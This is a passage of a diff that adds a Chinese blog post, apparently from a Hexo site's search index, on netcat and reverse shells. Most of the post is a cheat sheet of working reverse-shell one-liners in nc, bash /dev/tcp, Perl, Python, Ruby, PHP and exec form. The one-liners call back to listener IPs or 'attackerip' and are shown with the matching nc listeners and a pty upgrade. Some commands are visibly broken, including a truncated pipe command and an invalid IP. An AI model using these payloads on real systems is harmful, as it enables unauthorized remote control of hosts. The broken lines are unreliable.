+<li>-l 使用监听模式，管控传入的资料。</li>
+<li>-n 直接使用IP地址，而不通过域名服务器。</li>
+<li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li>
+<li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li>
+<li>-r 乱数指定本地与远端主机的通信端口。</li>
+<li>-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。</li>
+<li>-u 使用UDP传输协议。</li>
+<li>-v 显示指令执行过程。</li>
+<li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li>
+<li>-z 使用0输入/输出模式，只在扫描通信端口时使用。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -v 172.31.100.7 21</span><br></pre></td></tr></table></figure>
+
+<p>netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。</p>
+<h2 id="1、使用nc聊天"><a href="#1、使用nc聊天" class="headerlink" title="1、使用nc聊天"></a>1、使用nc聊天</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc -l 1567</span><br></pre></td></tr></table></figure>
+
+<p>netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc 172.31.100.7 1567</span><br></pre></td></tr></table></figure>
+
+<p>不管你在机器B上键入什么都会出现在机器A上。</p>
+<p>实测好像并不可以…</p>
+<h2 id="2、nc进行文件传输"><a href="#2、nc进行文件传输" class="headerlink" title="2、nc进行文件传输"></a>2、nc进行文件传输</h2><p>Server:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc -l 1567 &lt; file.txt &#96;&#96;&#96; Client: &#96;&#96;&#96; $nc -n 172.31.100.7 1567 &gt; file.txt</span><br></pre></td></tr></table></figure>
+
+<p>好像也不行…<br>不管这些还是直接来反弹shell吧</p>
+<h1 id="0x01-NC"><a href="#0x01-NC" class="headerlink" title="0x01 NC"></a>0x01 NC</h1><h2 id="1、正向反弹shell"><a href="#1、正向反弹shell" class="headerlink" title="1、正向反弹shell"></a>1、正向反弹shell</h2><p>服务器端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>本地</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc 192.168.242.129 7777</span><br></pre></td></tr></table></figure>
+
+<p>即可获得服务器端的shell</p>
+<h2 id="2、反向反弹shell"><a href="#2、反向反弹shell" class="headerlink" title="2、反向反弹shell"></a>2、反向反弹shell</h2><p>服务端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.242.1 7777</span><br></pre></td></tr></table></figure>
+
+<p>本地</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>不使用-e参数反弹<br>使用管道<br>服务端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod &#x2F;tmp&#x2F;backpipe p </span><br><span class="line">&#x2F;bin&#x2F;sh 0&#x2F;tmp&#x2F;backpipe</span><br></pre></td></tr></table></figure>
+
+<p>攻击端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lnvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>mknod需要root用户，但是也可以通过mkfifo /tmp/backpipe也可以创建一个管道。</p>
+<h1 id="0x02-Bash"><a href="#0x02-Bash" class="headerlink" title="0x02 Bash"></a>0x02 Bash</h1><p>服务端：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;sh -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;210.28.30.887&#x2F;53 0&gt;&amp;1&#39;</span><br><span class="line">或者</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.242.1&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>攻击端</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h1><h2 id="第一种方式（linux）"><a href="#第一种方式（linux）" class="headerlink" title="第一种方式（linux）"></a>第一种方式（linux）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.242.1&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; </span><br><span class="line">本地：nc -nvlp 7777</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二种方式（linux）"><a href="#第二种方式（linux）" class="headerlink" title="第二种方式（linux）"></a>第二种方式（linux）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.242.1:7777&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三种方式（windwos）"><a href="#第三种方式（windwos）" class="headerlink" title="第三种方式（windwos）"></a>第三种方式（windwos）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO -e &#39;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.27.32.227&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; </span><br><span class="line">本地：nc -nvlp 7777</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x05-ruby"><a href="#0x05-ruby" class="headerlink" title="0x05 ruby"></a>0x05 ruby</h1><h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)</span><br></pre></td></tr></table></figure>
+
+<p>一次性连接，连上就断，换上 msd 监听也是这样</p>
+<h2 id="第二种（linux）"><a href="#第二种（linux）" class="headerlink" title="第二种（linux）"></a>第二种（linux）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.10.10.166&quot;,4444).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)</span><br></pre></td></tr></table></figure>
+
+<p>一次性连接，连上就断，换上 msf 监听也是这样</p>
+<h2 id="第三种方式（windwos）-1"><a href="#第三种方式（windwos）-1" class="headerlink" title="第三种方式（windwos）"></a>第三种方式（windwos）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;10.10.10.166&quot;,&quot;4444&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.10.10.166&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">本地  nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x07-exec"><a href="#0x07-exec" class="headerlink" title="0x07 exec"></a>0x07 exec</h1><h2 id="第一种方式-1"><a href="#第一种方式-1" class="headerlink" title="第一种方式"></a>第一种方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444</span><br><span class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br><span class="line">本地：nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.10.166&#x2F;4444; sh &lt;&amp;196&gt;&amp;196 2&gt;&amp;196 </span><br><span class="line">本地 nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x08-原生的-shell-切换交互式-bash"><a href="#0x08-原生的-shell-切换交互式-bash" class="headerlink" title="0x08 原生的 shell 切换交互式 bash"></a>0x08 原生的 shell 切换交互式 bash</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -nvlp 4444 </span><br><span class="line">listening on [any] 4444 ... </span><br><span class="line">connect to [10.10.10.166] from (UNKNOWN) [10.10.10.50] 39840 </span><br><span class="line">$ $ $  </span><br><span class="line">$ python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; </span><br><span class="line">kevin@ubuntu:~$</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x09-最后"><a href="#0x09-最后" class="headerlink" title="0x09 最后"></a>0x09 最后</h1><p>个人觉得这几种应该就够用了，至于其他环境，再看具体情况吧，有一些环境服务器不一定有的</p>
+<p>参考链接：</p>
+<p><a href="https://www.cnblogs.com/deen-/p/7237327.html" target="_blank" rel="noopener">https://www.cnblogs.com/deen-/p/7237327.html</a></p>
+<p><a href="https://blog.csdn.net/Kevinhanser/article/details/88920278" target="_blank" rel="noopener">https://blog.csdn.net/Kevinhanser/article/details/88920278</a></p>
+]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
+      <tags>
+        <tag>反弹shell</tag>
+      </tags>
+  </entry>
+</search>
